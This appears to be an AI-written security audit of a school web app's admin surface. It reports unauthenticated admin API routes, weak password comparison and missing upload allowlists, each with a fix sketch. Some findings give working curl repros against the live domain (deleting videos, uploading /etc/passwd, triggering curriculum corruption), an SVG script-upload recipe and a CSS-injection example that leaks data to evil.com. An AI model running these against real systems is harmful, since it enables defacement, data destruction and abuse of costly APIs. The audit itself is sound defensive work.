# Whale-Class Admin Surface — Deep Code Audit

**Date:** May 16, 2026 (Session 113 V2)
**Auditor:** Subagent under principal-agent supervision
**Scope:** Whale-Class admin surface — `app/admin/**`, `app/api/admin/**`, `lib/auth.ts`, `lib/data.ts`, card generators, video/audio manager, QR generator, weekly admin docs, classroom curation pages
**Methodology:** Three passes — (1) cross-file consistency, (2) scenario walks, (3) fresh-eye re-read.

---

## EXECUTIVE SUMMARY

The Whale-Class admin surface is **older, more tactical code** than the multi-tenant Montree side. It evolved organically before the Phase 7/8 hardening Tredoux applied to Montree and Story. Its biggest exposure is at the **API surface**, not the page surface — middleware does protect every `/admin/*` page with `verifyAdminToken`, but the three `/api/admin/*` routes that actually do work have **zero authentication checks**. Anyone on the public internet who knows the URL structure can upload videos, delete media, mutate metadata, and silently corrupt the Whale Class curriculum.

The page surface is mostly safe-by-default (middleware enforces JWT before render), but it carries a dangerous amount of **dead code** — admin pages that call API routes which no longer exist. These pages render fine, then fail silently when the user tries to act, masking real bugs from the user (who concludes "the button is broken") and from the dev (who can't tell broken UI from missing endpoint).

The login flow itself has solid bones — rate limiting, HttpOnly cookie, 7-day JWT, audit logging — but uses **plaintext password comparison** vulnerable to timing attacks and **ignores the `ADMIN_PASSWORD` env var** documented in CLAUDE.md (only `SUPER_ADMIN_PASSWORD` and `TEACHER_ADMIN_PASSWORD` are wired into the actual login flow).

### Top 3 findings by impact

1. **CRITICAL — Three `/api/admin/*` routes have no auth check whatsoever.** `video-manager`, `media-library`, and `curriculum/sync-all` accept GET/POST/PATCH/DELETE from any unauthenticated caller. Attacker can upload arbitrary files into the Whale Class storage bucket, delete every video in the homepage list, replace metadata, mutate `weekly_assignments` table, auto-insert custom curriculum works, and corrupt `child_work_progress` for every student. The `/admin/*` page middleware does NOT extend to these API routes — the middleware's `WHALE_ONLY_PREFIXES` admin-JWT check covers `/api/whale/*` only.
2. **CRITICAL — Login route doesn't honor `ADMIN_PASSWORD` env, only `SUPER_ADMIN_PASSWORD` and `TEACHER_ADMIN_PASSWORD`.** CLAUDE.md documents three admin passwords but only two are usable. Either the docs lie (medium-grade trust failure) or `ADMIN_PASSWORD` was the intended login and the migration silently dropped it. Either way the documented model is wrong.
3. **HIGH — Hardcoded `WHALE_CLASSROOM_ID = 'bf0daf1b-cd46-4fba-9c2f-d3297bd11fc6'` in two route files contradicts the canonical `51e7adb6-cd18-4e03-b707-eceb0a1d2e69` in CLAUDE.md.** Weekly-planning upload and curriculum sync write to a classroom ID that the docs say is wrong. Either both routes have been writing to a stale classroom for months OR CLAUDE.md is wrong about the canonical Whale Class ID. There's no way to tell which without DB inspection.

### Posture verdict

The Whale-Class admin surface is **"functional for a single trusted operator at montree.xyz with no public exposure"** — but it relies entirely on URL obscurity for security at the API layer. A single Google indexing of any `/api/admin/*` URL in a leaked Railway log, a single mention in a public commit message, or an `OPTIONS` probe by a scanner against `montree.xyz/api/admin/*` is enough to expose every admin mutation endpoint to the open internet. This is not the same posture as the Montree multi-tenant side.

---

## ARCHITECTURE AS BUILT

### Auth flow

```
Browser              Login Page (/admin/login)
   ↓ POST username + password
/api/auth/login/route.ts
   ↓ checkRateLimit (5/15min)  ← lib/rate-limiter.ts
   ↓ getAdminCredentials() ← only reads SUPER_ADMIN_PASSWORD + TEACHER_ADMIN_PASSWORD
   ↓ plaintext === comparison  ← timing-attack vulnerable
   ↓ createAdminToken() ← lib/auth.ts, jose, HS256, 7d TTL
   ↓ Set-Cookie: admin-token (HttpOnly, Secure in prod, SameSite=Lax)
Browser              Cookie stored
   ↓
Browser              Hit /admin/<anything>
middleware.ts        Matches /admin prefix
   ↓ Read admin-token cookie
   ↓ verifyAdminToken() → boolean
   ↓ If valid: NextResponse.next()
   ↓ If invalid + no Supabase role: redirect → /admin/login
Server               Page renders
```

**Important:** the JWT payload contains ONLY `{ isAdmin: true }`. There is **no role distinction** between Tredoux (super admin) and Teacher logins. Both produce identical tokens. Audit log records the username at login time, but every subsequent action is logged as "an admin" with no way to tell which.

**Cookie config (`/api/auth/login/route.ts:80-86`):**
```ts
response.cookies.set('admin-token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7, // 7 days
  path: '/',
});
```

### Middleware coverage (`middleware.ts`)

- `matcher` (line 388-394) includes all non-API pages AND `/api/whale/:path*`.
- `/api/whale/*` → middleware enforces admin JWT (line 175-187) **except** `/api/whale/parent/*` and `/api/whale/teacher/*` (which have their own Supabase auth).
- `/admin/*` pages → middleware enforces admin JWT (line 222-233 then 290-294).
- `/api/admin/*` → **NOT in matcher.** No middleware-level auth check at all.
- `/api/auth/*` → bypasses to route handler.
- CSRF (line 129-164) blocks cross-origin state-changing requests, but no `Origin` header (curl/Postman) is treated as same-origin and allowed.

### API route auth posture by namespace

| Namespace | Middleware admin check | Route-level check | Effective posture |
|---|---|---|---|
| `/api/admin/video-manager` | NO | NO | OPEN |
| `/api/admin/media-library` | NO | NO | OPEN |
| `/api/admin/curriculum/sync-all` | NO | NO | OPEN |
| `/api/whale/*` (non-parent/teacher) | YES | varies | GATED by middleware |
| `/api/whale/parent/*` | NO | own auth | parent-scoped |
| `/api/whale/teacher/*` | NO | own auth | teacher-scoped |
| `/api/auth/login` | bypasses | own rate-limit + creds | proper |
| `/api/auth/logout` | bypasses | none (cookie delete is safe) | benign |
| `/api/curriculum-import/*` | NO | NO | OPEN |
| `/api/weekly-planning/*` | NO | NO | OPEN |

### Hardcoded Whale-Class classroom IDs

CLAUDE.md says (top of file):
```
- School ID: c6280fae-567c-45ed-ad4d-934eae79aabc (Tredoux House)
- Classroom ID: 51e7adb6-cd18-4e03-b707-eceb0a1d2e69 (Whale Class)
```

But the actual code hardcodes a DIFFERENT classroom ID in two places:
- `app/api/admin/curriculum/sync-all/route.ts:9` → `const WHALE_CLASSROOM_ID = 'bf0daf1b-cd46-4fba-9c2f-d3297bd11fc6';`
- `app/api/weekly-planning/upload/route.ts:65` → `.eq('classroom_id', 'bf0daf1b-cd46-4fba-9c2f-d3297bd11fc6')`

Either the CLAUDE.md ID is stale, the code is targeting a stale classroom, or there are two separate Whale Class records in production. Without DB access I cannot confirm — but the inconsistency itself is a finding: **if you ever decided to roll the classroom_id (e.g. migrate to a new school record), these hardcoded values would silently target the old one forever.**

### File upload pipeline (video-manager)

Two upload modes in `app/api/admin/video-manager/route.ts`:

1. **Signed-URL mode** (preferred, content-type `application/json`):
   - POST with `{ title, category, week, fileName, contentType, mediaType }`
   - Server generates `id = ${idPrefix}_${Date.now()}_${random9}` where `idPrefix` = `aud_` for audio, `vid_` for video
   - Computes `storagePath = ${storageFolder}/${id}.${extension}` where `storageFolder = audio | videos`
   - **`extension` derived from `originalName.split('.').pop() || (isAudio ? 'mp3' : 'mp4')`** — no allowlist
   - Calls `supabase.storage.from(STORAGE_BUCKET).createSignedUploadUrl(storagePath)` → returns signed URL
   - Saves metadata via `addVideo(video)` BEFORE the file is uploaded — metadata may exist without a backing file if the client never completes the upload

2. **Legacy FormData mode** (fallback, content-type `multipart/form-data`):
   - POSTs file directly through server (Railway 50MB-ish limit)
   - Same extension-from-filename treatment
   - No MIME-type validation; whatever browser claims is what gets saved as Storage `contentType`

### Card generator pipeline (3-Part / Sentence Match / Sorting Mat)

Card generators are **purely client-side**:
- Photos read via `FileReader` → `image/data:` URLs
- Photo bank items fetched as blobs, converted to dataURL via `FileReader`
- Print output rendered via `printWindow.document.write(html)` into a new window
- HTML escapes labels via `escapeHtml()` from `lib/sanitize.ts` — XSS-safe
- Image src protected by `sanitizeImageUrl()` allowlist
- `fontFamily` and `borderColor` interpolated raw into `<style>` blocks — they come from controlled `<select>` / `<input type="color">` so attacker can't reach them via UI, but the components don't defend if called programmatically with hostile values

The picture-bingo generator (`public/tools/picture-bingo-generator.html`) is a **static HTML file in `/public`** — accessible without any login on `montree.xyz/tools/picture-bingo-generator.html`. Documented as intentional in CLAUDE.md ("not API-gated"). Tredoux is OK with this; logged for completeness.

### Dead-API page surface

Many `/admin/*` pages call API routes that **do not exist in `app/api/admin/**/route.ts`**:
- `/api/admin/proxy-mode` (called from `/admin/login` 3 times)
- `/api/admin/teacher-students` (called from `/admin/teacher-students`)
- `/api/admin/parent-signups`, `/api/admin/parent-signups/approve`, `/api/admin/parent-signups/reject` (called from `/admin/parent-signups`)
- `/api/admin/audit-logs` (called from `/admin/rbac-management`)
- `/api/admin/rbac`, `/api/admin/rbac/teachers` (called from `/admin/rbac-management`)
- `/api/admin/seed-curriculum` (called from `/admin/schools/[slug]/curriculum`)
- `/api/admin/curriculum-works` (called from `/admin/add-video`)
- `/api/admin/add-video` (called from `/admin/add-video`)
- `/api/admin/videos` (called from `/admin/video-management`)

The actual `/api/admin/**/route.ts` files in the repo:
- `app/api/admin/curriculum/sync-all/route.ts`
- `app/api/admin/media-library/route.ts`
- `app/api/admin/video-manager/route.ts`

Three. Out of dozens of admin pages that reference admin APIs. Most admin tools are non-functional in production.

---

## FINDINGS

### Authentication & authorization

#### CRITICAL — `/api/admin/video-manager` has no auth check
- **Where:** `app/api/admin/video-manager/route.ts` (entire file, all four methods GET/POST/PATCH/DELETE)
- **What:** No call to `getAdminSession()`, `verifyAdminToken()`, or any equivalent. The middleware doesn't extend admin-JWT enforcement to `/api/admin/*` (only to `/api/whale/*` per `middleware.ts:175-187`).
- **Repro:** From an unauthenticated browser, curl, or Postman session:
  ```
  curl -X DELETE 'https://montree.xyz/api/admin/video-manager?id=vid_xxx'
  → 200, video deleted from videos.json + Supabase Storage
  ```
  Or POST a signed-URL request:
  ```
  curl -X POST https://montree.xyz/api/admin/video-manager \
    -H 'Content-Type: application/json' \
    -d '{"title":"Pwn","category":"song-of-week","fileName":"x.mp4","contentType":"video/mp4"}'
  → 200, returns signedUrl, attacker uploads arbitrary file into the 'videos' bucket
  ```
  No `Origin` header → middleware CSRF allows. No admin-token cookie → middleware doesn't gate API routes outside `/api/whale/*`.
- **Why it matters:** This route controls every video that appears on the public Whale Class homepage. An attacker can: (a) delete every video on `teacherpotato.xyz`, (b) replace song-of-the-week metadata with anything, (c) upload arbitrary files into Supabase Storage and have them surface as `getPublicUrl()`-resolved URLs that the homepage will autoplay. Combined with the missing MIME type check (next finding), this is a defacement + storage exhaustion vector.
- **Fix sketch:** Add `getAdminSession()` check at the top of every handler in the file. Same pattern as the Story admin routes (e.g. `app/api/story/admin/visits/route.ts`). Or wrap `/api/admin/*` in the same middleware admin-JWT gate that `/api/whale/*` uses — extend `middleware.ts:172-189`.

#### CRITICAL — `/api/admin/media-library` has no auth check
- **Where:** `app/api/admin/media-library/route.ts` (all four methods)
- **What:** Same gap as video-manager. GET (read all uploaded documents), POST (upload arbitrary file into `lesson-documents` Storage bucket), DELETE (purge any document by id), PATCH (rename + reassign week_number) all unauthenticated.
- **Repro:**
  ```
  curl -X POST https://montree.xyz/api/admin/media-library \
    -F 'file=@/etc/passwd' \
    -F 'week_number=1'
  → 200, file uploaded to lesson-documents/2026/week-1/<timestamp>-_etc_passwd
  ```
  `safeOriginalName = file.name.replace(/[^a-zA-Z0-9.-]/g, '_')` (line 74) does strip path separators, so no path traversal escape from the year/week prefix. But the upload still happens.
- **Why it matters:** Attacker can pollute the Whale Class lesson-documents bucket indefinitely, exhaust storage quota, and serve files from a `montree.xyz`-adjacent URL. Combined with DELETE access, attacker can also purge real lessons.
- **Fix sketch:** Same as above. Add `getAdminSession()` gate.

#### CRITICAL — `/api/admin/curriculum/sync-all` has no auth check
- **Where:** `app/api/admin/curriculum/sync-all/route.ts` (POST handler)
- **What:** Unauthenticated POST triggers a full curriculum sync that (a) reads all unlinked `weekly_assignments`, (b) inserts new `montree_classroom_curriculum_works` rows for any unmatched assignment with attacker-controllable `work_name`, (c) updates `weekly_assignments.work_id`, (d) upserts `child_work_progress.status` for every child × every backfilled work (mark works as "mastered" via backfill — see line 219).
- **Repro:**
  ```
  curl -X POST https://montree.xyz/api/admin/curriculum/sync-all
  → 200, server immediately starts mutating curriculum
  ```
  If an attacker first poisons `weekly_assignments` (via the also-unprotected `/api/weekly-planning/upload` route) with hostile work names, this endpoint will auto-insert them into the curriculum AND mark them mastered on every student via the sequence-backfill at line 213-222.
- **Why it matters:** Silent corruption of the curriculum for every Whale Class student. Backfill marks every "earlier" work as `status=3` (mastered) for every child, which can erase real `practicing` / `presented` state. The `// Only upgrade, never demote` comment at line 253 doesn't help if the curriculum itself is poisoned upstream.
- **Fix sketch:** Add `getAdminSession()` gate. Also reconsider whether unauthenticated batch mutations like this should exist at all — the route is intended for super-admin maintenance, not an exposed API.

#### HIGH — Plaintext password comparison (timing attack)
- **Where:** `app/api/auth/login/route.ts:56-58`
- **What:**
  ```ts
  const isValid = getAdminCredentials().some(
    cred => cred.username === username && cred.password === password
  );
  ```
  String `===` short-circuits per-character. With network jitter measurable, an attacker can in principle iterate one character at a time. Practical exploitability is low for short attempts (5/15min rate limit at line 28-30 helps a lot), but the gap is real and trivial to close.
- **Why it matters:** The rate limiter mitigates but doesn't eliminate. Best practice is constant-time compare for credentials, especially since this protects the entire Whale Class admin surface and the Story system has bcrypt-hashed passwords by contrast.
- **Fix sketch:** Use `crypto.timingSafeEqual()` after equal-length padding, or bcrypt-hash the env-var passwords at app start and use `bcrypt.compare()`. Same approach `lib/verify-super-admin.ts:43` uses for super-admin.

#### HIGH — `ADMIN_PASSWORD` env var documented but not wired
- **Where:** `app/api/auth/login/route.ts:10-19` (`getAdminCredentials()` reads `SUPER_ADMIN_PASSWORD` + `TEACHER_ADMIN_PASSWORD` only)
- **What:** CLAUDE.md (Environment Variables section + Authentication section) documents `ADMIN_PASSWORD` as the "Whale Class admin password." The actual login flow ignores `ADMIN_PASSWORD` entirely. Only two usernames are recognised: `Tredoux` (via `SUPER_ADMIN_PASSWORD`) and `Teacher` (via `TEACHER_ADMIN_PASSWORD`).
- **Repro:** Set `ADMIN_PASSWORD=foo` in Railway env. Try to log in with any username + `foo`. Login fails.
- **Why it matters:** The discrepancy is a documentation lie. If a future agent reads CLAUDE.md and tries to wire a third role (e.g. an assistant teacher), the env var will not work and they'll waste time debugging. Also if Tredoux ever rotates and writes the new password to `ADMIN_PASSWORD` thinking that's "his" password (matching the doc), he'll lock himself out.
- **Fix sketch:** Either (a) wire `ADMIN_PASSWORD` properly with a documented username, or (b) remove the variable from CLAUDE.md + `.env.example`. Recommend (b) since the system has cleanly converged on Tredoux + Teacher.

#### HIGH — JWT carries no role distinction between Tredoux and Teacher
- **Where:** `lib/auth.ts:18-34` (`AdminSession` is `{ isAdmin: boolean }`; `createAdminToken` payload is `{ isAdmin: true }`)
- **What:** Tredoux's login and the Teacher login produce identical JWTs. There's no way for any downstream route or page to check "am I the super-admin or the teacher?" The audit log captures the username at login time but every subsequent action is logged as "admin" with no way to attribute.
- **Why it matters:** Once an admin tool is used by both roles (e.g. a teacher hits the qr-generator), there's no separation. The teacher can do everything Tredoux can. Should a future iteration of this surface ever divide capabilities (e.g. teachers shouldn't be able to delete videos), the architecture has no foothold.
- **Fix sketch:** Add `role: 'super' | 'teacher'` to the JWT payload and to `AdminSession`. Then route handlers can `if (session.role !== 'super') return 403`. Mirrors the Montree principal/teacher split.

#### MED — `/api/auth/login` audit logs the wrong identifier on failure
- **Where:** `app/api/auth/login/route.ts:42-44, 61-67`
- **What:** Failed login logs `adminIdentifier: username || ip`. If an attacker submits a username field with arbitrary content (e.g. SQL injection probe, XSS payload, multi-line garbage), that content is what gets stored in `montree_super_admin_audit.admin_identifier`. The audit table is service-role-only so this isn't a direct injection vector, but it pollutes the audit log with attacker-controlled strings up to whatever character limit Postgres `TEXT` allows.
- **Why it matters:** A determined attacker can write arbitrary garbage into the audit log and obscure their own attempts. Logs become harder to scan. If the audit table is ever displayed in an admin UI, stored XSS becomes possible.
- **Fix sketch:** Truncate `username` to 64 chars and strip non-printable characters before logging. Same fix should apply across every audit-logger call site.

#### MED — Login page's `checkProxyMode` fetch silently fails
- **Where:** `app/admin/login/page.tsx:16-28`
- **What:** Calls `/api/admin/proxy-mode` which does not exist. The fetch resolves to a 404 (Next.js's default 404 returns HTML, not JSON), `response.json()` throws, `setProxyEnabled(data.proxyEnabled || false)` runs with `data = undefined`. The catch block fires silently.
- **Why it matters:** The "Video Proxy Mode" toggle on the login page shows whatever `proxyEnabled` defaulted to (false). User flips it on, expects it to persist server-side, but the persist also fails silently (POST to `/api/admin/proxy-mode` 404s, falls through to the cookie write at line 41/43/47). Cookie-only persistence works, but the UX implies server state.
- **Fix sketch:** Either create the route OR remove the entire proxy-mode UI from the login page. The cookie approach (lines 41, 43, 47) is what actually carries the state — keep that, delete the fetch attempts.

#### MED — Multiple admin pages call non-existent API endpoints
- **Where:** Various `/admin/*` pages (see "Dead-API page surface" section in Architecture above)
- **What:** At least 10 admin pages reference `/api/admin/*` routes that do not exist in `app/api/admin/**/route.ts`. Pages render (because middleware lets the page through), then break when the user takes any action.
- **Why it matters:** Bugs masquerade as UI issues. User reports "the Approve button doesn't work" but the actual cause is the route file is gone (or was never created). Wastes debugging time and erodes trust.
- **Fix sketch:** Inventory the dead admin pages. Either implement the missing routes (if the feature is wanted) or delete the pages (hide-don't-delete posture: keep the route file but redirect to `/admin` with a deprecation notice). Each page that calls a missing API should be on a known list.

#### MED — Page-level `checkAuth()` is a no-op due to missing `/api/videos` route
- **Where:** `app/admin/page.tsx:72-79`, `app/admin/english-curriculum/page.tsx:59-65`, `app/admin/daughter-activity/page.tsx:70-78`, several other admin pages
- **What:** Pattern is:
  ```ts
  const checkAuth = async () => {
    try {
      const response = await fetch("/api/videos");
      if (response.status === 401) router.push("/admin/login");
    } catch { router.push("/admin/login"); }
  };
  ```
  `/api/videos` does not exist as a route — only `/api/public/videos` does. So `fetch("/api/videos")` returns 404, never 401, and the redirect logic NEVER fires. The catch block only catches network errors.
- **Why it matters:** Defense-in-depth lost. If a future middleware regression let an unauthenticated user past the page gate, the page-level `checkAuth` would do nothing to catch it. (Today middleware does catch it, so the page is still protected — but the page-level check is theatre.)
- **Fix sketch:** Either delete the page-level `checkAuth` calls (relying on middleware is fine — it's tested and consistent), or point them at a real auth-check endpoint like `/api/auth/me` (would need to be built) that returns 200/401.

#### MED — Video proxy-mode cookie set without any path/secure flags
- **Where:** `app/admin/login/page.tsx:41, 43, 47`
- **What:** `document.cookie = \`video-proxy-enabled=${enabled}; path=/; max-age=...\`` — no `Secure`, no `SameSite`, no `HttpOnly` (can't be httpOnly from client-side JS). This is the only cookie set by the login flow that the server doesn't manage.
- **Why it matters:** Low impact since the cookie just toggles a UI feature, but it falls out of the otherwise-tight cookie posture (the admin-token cookie has Secure + SameSite=Lax).
- **Fix sketch:** Add `Secure;SameSite=Lax` to the cookie string. Or better, store this preference in localStorage instead since it's a pure UI preference with no server enforcement.

### Input validation & file uploads

#### HIGH — Video upload has no MIME type allowlist
- **Where:** `app/api/admin/video-manager/route.ts:62, 121-122`
- **What:** Both upload paths (signed-URL JSON mode + legacy formdata mode) trust `contentType`/`fileName` from the client. The extension is derived from `originalName.split('.').pop() || 'mp4'`. No allowlist — attacker can supply `.html`, `.php`, `.js`, `.svg` (XSS via SVG is a known issue). The storage path is then `videos/${id}.${extension}` and a public URL is generated.
- **Repro:**
  ```
  POST /api/admin/video-manager
  body: { "title":"X", "category":"phonics", "fileName":"evil.svg", "contentType":"image/svg+xml" }
  → returns signed URL for videos/vid_<id>.svg
  upload arbitrary SVG with embedded JS to that URL
  → public URL becomes https://dmfncjjtsoxrnvcdnvjq.supabase.co/storage/v1/object/public/videos/videos/vid_<id>.svg
  Anyone embedding that URL in an <img> or hitting it directly executes the script
  ```
- **Why it matters:** Supabase Storage public URLs are not on montree.xyz, so the SVG's JS doesn't run with montree.xyz origin — but it does run with Supabase's, which can read/write to other Storage buckets the cookie has access to. More importantly, the homepage renders these as `<video>` or `<audio>` elements; if attacker uploads a non-AV file with a video MIME type, the homepage breaks silently and the video grid shows broken thumbnails.
- **Fix sketch:** Whitelist `extension ∈ ['mp4', 'mov', 'webm', 'mp3', 'm4a', 'wav', 'aac', 'ogg']` and `contentType ∈ ['video/*', 'audio/*']` (with explicit checks, not just prefix). Reject anything else with 400.

#### HIGH — Media-library upload has no MIME type allowlist
- **Where:** `app/api/admin/media-library/route.ts:73-89`
- **What:** Same issue. `ext = file.name.split('.').pop() || 'bin'`. Any file type accepted. Stored under `${year}/week-${weekNumber}/${timestamp}-${safeName}` in the `lesson-documents` bucket.
- **Why it matters:** Same XSS-via-SVG vector. Also enables uploading executable files (`.exe`, `.dll`, `.ps1`) that might be served to teachers later via the media-library list view.
- **Fix sketch:** Whitelist extensions appropriate for lesson docs: `pdf, doc, docx, ppt, pptx, png, jpg, jpeg, mp4, webm`. Reject everything else.

#### HIGH — Weekly-planning upload has no file size or type check
- **Where:** `app/api/weekly-planning/upload/route.ts:38-50`
- **What:** Route reads file from FormData, immediately tries `extractDocxText(buffer)` (using mammoth), and on failure falls back to `buffer.toString('utf-8')`. Then sends the text to Anthropic. No type check, no size check.
- **Why it matters:** Attacker can upload a multi-gigabyte file → Railway accepts it → server attempts to parse → server then attempts to UTF-8 decode → OOM kills the container OR Anthropic call burns through the API budget on garbage input. Anthropic call has `maxDuration=120` and no per-IP rate limit; an attacker can submit 60 large files in parallel and incinerate the Anthropic budget for the day.
- **Repro:**
  ```
  curl -X POST https://montree.xyz/api/weekly-planning/upload \
    -F 'file=@1gb-random.bin'
  → server tries to parse 1GB as docx, fails, falls to UTF-8 decode, sends to Claude
  ```
- **Fix sketch:** Cap `file.size <= 10MB`. Validate `file.type === 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'` OR filename ends in `.docx`. Add IP-based rate limit (e.g. 3 uploads / 10 min per IP).

#### MED — `getVideos` / `saveVideos` race condition on the videos.json file
- **Where:** `lib/data.ts:48-197`, `addVideo` at line 199-240
- **What:** The video metadata is a JSON file in Supabase Storage. `getVideos()` downloads it, `addVideo()` reads → mutates in memory → writes. Two concurrent uploads can: both read the same array, both push their new video, both write — the second write clobbers the first. The retry loop at line 202-238 doesn't help because the conflict isn't detected (no ETag, no version check).
- **Why it matters:** Real, observed race: simultaneous uploads from two browser tabs can lose one video's metadata. The file IS uploaded to Storage but never appears in the homepage list. The 1-second eventual-consistency sleep at line 223 is hopeful but doesn't actually solve the lost-update problem.
- **Fix sketch:** Move metadata out of a JSON file in Storage. Use a real DB table (`videos` in Supabase Postgres) with row-level inserts. Each upload becomes an isolated INSERT. The JSON file is a 2026-vintage pattern that should be retired.

#### MED — `confirm()` / `alert()` dialogs in admin actions
- **Where:** Multiple — `app/admin/video-manager/page.tsx:75`, `app/admin/media-library/page.tsx:87,88`, others
- **What:** Destructive operations like deleting a video confirm via `window.confirm()`. These are blocking, ugly, and can be auto-dismissed by some browser extensions or scripted clicks.
- **Why it matters:** Not a security issue per se, but a UX risk for destructive operations. A misclick on "Delete" with auto-dismiss enabled wipes the video instantly.
- **Fix sketch:** Replace with a custom modal that requires explicit click on a clearly-labeled red button. Mirrors Montree's destructive-action UX.

#### LOW — Card-generator `fontFamily` / `borderColor` interpolated raw into CSS
- **Where:** `components/card-generator/print-utils.ts:305, 687, 1009, 1310` (and similar in sorting-mat-generator)
- **What:** `font-family: "${fontFamily}", cursive;` and equivalent `borderColor` interpolations. Both come from controlled `<select>` / `<input type="color">` so attacker can't reach them via UI, but the components don't defend against programmatic misuse.
- **Why it matters:** Defense-in-depth gap. If anything downstream ever lets users edit these values directly, CSS injection becomes possible (e.g. `Arial"; background-image: url('http://evil.com/leak?')`).
- **Fix sketch:** Whitelist allowed fonts (`['Comic Sans MS', 'Arial', 'Times New Roman', ...]`) and validate the borderColor as `^#[0-9a-fA-F]{6}$` before interpolation. Cheap and bulletproof.

### Data integrity & hardcoded values

#### HIGH — Hardcoded `WHALE_CLASSROOM_ID` contradicts CLAUDE.md
- **Where:**
  - `app/api/admin/curriculum/sync-all/route.ts:9` → `'bf0daf1b-cd46-4fba-9c2f-d3297bd11fc6'`
  - `app/api/weekly-planning/upload/route.ts:65` → same literal
  - CLAUDE.md (Database section) → Whale Class is `'51e7adb6-cd18-4e03-b707-eceb0a1d2e69'`
- **What:** Two completely different UUIDs. Either CLAUDE.md is wrong (and these routes correctly target the production Whale Class) OR the routes are writing to a stale/dead classroom.
- **Why it matters:** If the routes write to the wrong classroom, every weekly upload Tredoux does is going to a ghost classroom that no student is enrolled in. The dashboard would show no progress updates — and Tredoux would never know because the upload returns 200. The CLAUDE.md drift is also a recurring bug pattern (multiple sessions have caught CLAUDE.md vs reality drift).
- **Fix sketch:** Verify in Supabase which classroom UUID matches Whale Class. If `bf0daf1b…` is wrong, update both routes. If `51e7adb6…` in CLAUDE.md is wrong, update the doc. Lift the canonical ID into an env var so it's set once and referenced everywhere — `WHALE_CLASSROOM_ID = process.env.WHALE_CLASSROOM_ID || throwIfMissing()`.

#### MED — `app/admin/page.tsx` uses hardcoded `stats.children = 18` as fallback
- **Where:** `app/admin/page.tsx:63, 100`
- **What:** The default children count is `18`. CLAUDE.md says Whale Class has 20 students. Hardcoded stale number.
- **Why it matters:** Cosmetic but indicative — Tredoux's dashboard says "18 students" when there are 20 if `/api/classroom/children` fails. The fallback should be `0` or `?` (not silently wrong).
- **Fix sketch:** Change `setStats({ children: 18, works: 213, games: 20, week: 4 })` to all zeros, render `—` or a skeleton until real data loads.

#### MED — `lib/data.ts:50` cloud-mode detection brittle
- **Where:** `lib/data.ts:50`, `lib/data.ts:129`
- **What:** `const isCloud = process.env.VERCEL === "1" || process.env.RAILWAY_ENVIRONMENT || process.env.NODE_ENV === "production";`
- **Why it matters:** If any local dev environment sets `NODE_ENV=production` (some Next.js test runners do), the filesystem-vs-Supabase decision flips silently. Local development would suddenly start writing to production Supabase Storage. The bug would manifest as "I added a test video locally and it appeared on the production homepage."
- **Fix sketch:** Use a single dedicated env var like `WHALE_STORAGE_MODE=cloud` instead of inferring from `NODE_ENV` + multiple cloud-platform-detection vars. Be explicit about which bucket the code is writing to.

### Error handling & observability

#### MED — `xhrUpload` retries 3 times with no exponential backoff cap
- **Where:** `app/admin/video-manager/page.tsx:186-204`
- **What:** Upload retry: attempt 1, then 2s wait, then attempt 2, then 4s wait, then attempt 3. Each attempt has a 10-minute timeout (`xhr.timeout = 600_000`). Worst case the user waits 30+ minutes for an upload to fail.
- **Why it matters:** UX. User sees "Retrying..." for 6+ seconds between attempts and a stale progress bar — they often abandon the upload and start a fresh attempt, which then races with whatever the retry eventually does.
- **Fix sketch:** Cap total retry time to 60s. Surface "Retry now?" button to user instead of auto-retrying invisibly. Or distinguish network-error retry (fast retry) from server-error 5xx (don't retry).

#### LOW — Silent catch blocks
- **Where:** `app/admin/page.tsx:107`, `app/admin/login/page.tsx:26` ("console.error… checking proxy mode"), `lib/data.ts:122-124`, `app/admin/video-manager/page.tsx:69-70`
- **What:** Several catch blocks log to `console.error` and continue. No surfacing to user, no Sentry-like upstream.
- **Why it matters:** When something breaks, Tredoux has to ask Claude to read Railway logs. Smaller class of bug than the auth gaps but adds friction.
- **Fix sketch:** Add the standard `logServerError()` helper from `lib/montree/server-errors.ts` to surface in super-admin Errors tab.

### Cross-product / boundaries

#### MED — Description-Review page (Whale-Class admin) writes to Montree multi-tenant DB
- **Where:** `app/admin/description-review/page.tsx:50, 105, 132`
- **What:** Page is at `/admin/description-review` (Whale Class admin) but every API call goes to `/api/montree/curriculum/*` (Montree side, multi-tenant). It pulls `classroomId` from `getClassroomId()` (Montree session in localStorage, NOT the admin-token cookie).
- **Why it matters:** If a Whale Class admin is logged in but has no Montree session (likely — different login flows), the page silently shows no works. Worse, if the admin IS also logged into Montree as a different classroom, this page mutates THAT classroom's descriptions, not Whale Class's. The two auth systems are unaware of each other and the page mixes both.
- **Fix sketch:** Decide which side this page belongs on. If it's Whale Class admin, it should write to the canonical Whale Class classroom ID (whatever that is, see HIGH finding above). If it's Montree, move it under `/montree/admin/*` so the auth model is obvious.

#### MED — `/api/admin/curriculum/sync-all` reads `weekly_assignments` and `child_work_progress` — not Montree tables
- **Where:** `app/api/admin/curriculum/sync-all/route.ts:96, 232, 274`
- **What:** Reads from `weekly_assignments` and writes to `child_work_progress` — both legacy Whale Class tables. Also writes to `montree_classroom_curriculum_works` (a Montree table). The route bridges two schemas.
- **Why it matters:** Same dual-product confusion as description-review. If `weekly_assignments` schema ever changes (or gets deprecated, as Session 78's Migration 181+ suggests), this route silently breaks.
- **Fix sketch:** Document the schema crossover clearly at the top of the route. Audit which tables are still in use. If `weekly_assignments` is legacy, decide on a deprecation path.

### Session, cookies, CSRF

#### MED — Middleware CSRF allows requests with no `Origin` header
- **Where:** `middleware.ts:129-164`
- **What:** CSRF check skips when there's no `Origin` header. Comment at line 163 says "No Origin header = same-origin or non-browser client (curl, Postman) — allowed."
- **Why it matters:** Combined with the unprotected `/api/admin/*` routes, this means an attacker can mount a fully CSRF-style attack from a malicious page by stripping the Origin header via a server-side proxy (or just curl-ing it directly). The "same-origin or non-browser" allowance is too generous.
- **Fix sketch:** Require an explicit CSRF token (double-submit cookie pattern) for state-changing requests, OR at minimum require `Origin` match for cross-origin POSTs and refuse missing-Origin POSTs. Today's posture trusts the network too much.

#### LOW — Admin-token cookie path is `/` not `/admin`
- **Where:** `app/api/auth/login/route.ts:85`
- **What:** Cookie scope is the entire domain. Any path on `montree.xyz` can read it (well, server-side — it's HttpOnly).
- **Why it matters:** Minor. Scoping to `/admin` would prevent the cookie from being attached on unrelated requests (e.g. `/montree/*`), reducing the surface for accidental cookie leakage in logs.
